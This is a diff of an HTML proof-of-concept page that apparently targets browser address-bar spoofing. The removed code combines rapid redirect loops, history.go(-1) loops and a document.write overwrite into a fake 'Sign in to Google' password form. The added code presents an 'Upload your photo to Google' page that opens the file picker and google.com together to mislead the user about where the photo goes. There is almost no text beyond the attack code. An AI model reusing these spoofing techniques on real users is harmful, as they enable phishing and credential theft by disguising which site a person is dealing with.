@@ -1,32 +1,61 @@
 <!DOCTYPE html>
 <html>
-<body>
-<script>
-    // Repeated redirect to spoof trusted site
-    v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';x.location = 'https://www.google.com'`, 100);
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      text-align: center;
+      font-family: sans-serif;
+      padding: 2em;
+    }
 
-    // After 3.3 seconds, replace page content with fake login and stop redirects
-    i = setInterval(`
-        document.open();
-        document.write(\`
-            <style>
-                body { font-family: sans-serif; margin-top: 100px; text-align: center; }
-                input { margin: 10px; padding: 10px; width: 250px; font-size: 16px; }
-                button { padding: 10px 20px; font-size: 16px; }
-            </style>
-            <h1>Sign in to Google</h1>
-            <input type="email" placeholder="Email or phone" /><br>
-            <input type="password" placeholder="Enter your password" /><br>
-            <button>Next</button>
-            <p style="color:gray">To continue to Gmail</p>
-        \`);
-        document.close();
-        clearInterval(v);
-        clearInterval(i);
-    `, 3300);
+    input[type="file"] {
+      display: none;
+    }
+
+    img {
+      width: 100%;
+      margin-top: 1em;
+      display: none;
+    }
+
+    button {
+      padding: 12px 24px;
+      font-size: 18px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+
+<h1>Upload your photo to Google</h1>
+<button id="uploadBtn">Upload Photo</button>
+
+<input id="fileSelect" type="file" accept="image/*" />
+<img id="imgPreview" />
+
+<script>
+  const uploadBtn = document.getElementById('uploadBtn');
+  const fileSelect = document.getElementById('fileSelect');
+  const imgPreview = document.getElementById('imgPreview');
+
+  // Button click triggers file select + opens Google
+  uploadBtn.onclick = () => {
+    fileSelect.click();
+    window.open('https://google.com', '_blank');
+  };
+
+  // When file is selected, show preview
+  fileSelect.onchange = () => {
+    if (fileSelect.files.length > 0) {
+      imgPreview.src = URL.createObjectURL(fileSelect.files[0]);
+      imgPreview.style.display = 'block';
+    }
+  };
 </script>
 
-<h1>URL Spoofing Bar</h1>
-<input onclick="setInterval(function(){window.history.go(-1)}, 30)" type="button" value="Go to google.com" />
 </body>
 </html>
